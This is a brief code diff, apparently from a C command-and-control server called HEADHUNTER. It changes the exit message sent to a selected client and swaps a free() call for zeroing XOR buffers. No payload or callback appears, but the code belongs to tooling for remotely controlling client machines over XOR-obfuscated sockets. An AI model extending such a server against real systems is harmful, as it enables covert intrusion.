@@ -104,7 +104,7 @@ int server_control_session(){
 			selected_id += 3;
 			for(int i = 0; i < max_clients; i++){
 				if(client_socket[i] == selected_id){
-					char* exit = "exit\n";
+					char* exit = "--HEADHUNTER EXIT--\n";
 					char* xorexit = XOR(exit, key, strlen(exit), keylen);
 					send(client_socket[i], xorexit, strlen(exit), 0);
 					close(client_socket[i]);
@@ -192,7 +192,8 @@ void *Socket_Reader(){
         fflush(NULL);
         fflush(NULL);
 
-	free(xorbuffer);
+	memset(xorbuffer, '\0', strlen(xorbuffer));
+	memset(buffer, '\0', strlen(buffer));
     }
 
     if (n < 0)
